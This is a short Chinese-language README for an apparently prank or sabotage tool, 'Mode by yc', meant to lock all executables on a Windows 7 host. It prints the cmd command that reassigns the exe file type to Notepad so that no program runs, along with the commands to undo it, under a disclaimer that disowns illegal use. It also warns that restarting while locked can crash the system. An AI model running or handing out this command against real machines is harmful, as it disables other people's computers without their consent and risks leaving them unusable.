Mode by yc
免责声明：任何使用非法用途与开发人员无关，请自行考虑后果
1、工具版权说明：
	版本：1.0
	大家好，我是夜程，QQ：3365487579
	网站:www.lang-v.com
	
2、工具对象说明：
	该工具开发与windows7系统，锁文件适合windows主机
3、工具使用说明：
	Lock工程文件把计算机所有exe文件加锁，均导致不能正常运行
	Unlock工程解锁exe

锁法：
cmd命令：ftype exefile=notepad.exe %1
解锁
cmd命令：
assoc .exe=exefile
ftype exefile="%1" %*

4、注意事项：
	如果锁了之后，关机或重启电脑了，导致系统崩溃，请重启高级模式执行cmd命令